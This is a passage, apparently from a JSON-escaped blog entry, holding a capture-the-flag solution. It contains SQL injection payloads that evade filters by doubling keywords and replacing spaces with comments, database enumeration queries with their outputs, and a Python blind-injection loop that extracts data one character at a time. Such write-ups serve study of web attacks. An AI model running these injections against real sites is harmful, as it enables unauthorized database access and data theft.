flag=\u0026#34;\u0026#34; # select=\u0026#34;select/**/version()\u0026#34;#10.5.28-MariaDB-0+deb11u2 select=\u0026#34;seselectlect/**/group_concat(schema_name)/**/from/**/information_schema.schemata\u0026#34;#information_schema,performamce_schema,mysql,ctf,xuanyuanCTF select=\u0026#34;seselectlect/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\u0026#39;xuanyuanCTF\u0026#39;\u0026#34; #xuyuanCTF info select=\u0026#34;seselectlect/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=%27xuanyuanCTF%27/**/and/**/table_name=\u0026#39;info\u0026#39;\u0026#34; #xuyuanCTF id,title,content select=\u0026#34;seselectlect/**/group_concat(id,title,content)/**/from/**/xuanyuanCTF.info\u0026#34; #1F1AG ZmxhZ3vmrILov47mnaXli7DovanovpXmna99 #flag{欢迎来到轩辕杯} for i in range(1,100): # if i\u0026lt;=25: # continue left=32 right=127 mid=(left+right)//2 while left\u0026lt;right: poc1=f\u0026#34;?id=1/**/and/**/(if(ascii(substr(({select}),{i},1))\u0026gt;{mid},1,0))\u0026#34; payload=poc1 time.sleep(1) r=requests.get(url+payload) if \u0026#34;admin\u0026#34; in r.text: left=mid+1 else: right=mid mid=(left+right)//2 flag+=chr(mid) print(flag) ","date": "2025-05-20 00:00:00",
    "updated": "2025-05-20 00:00:00"
  }]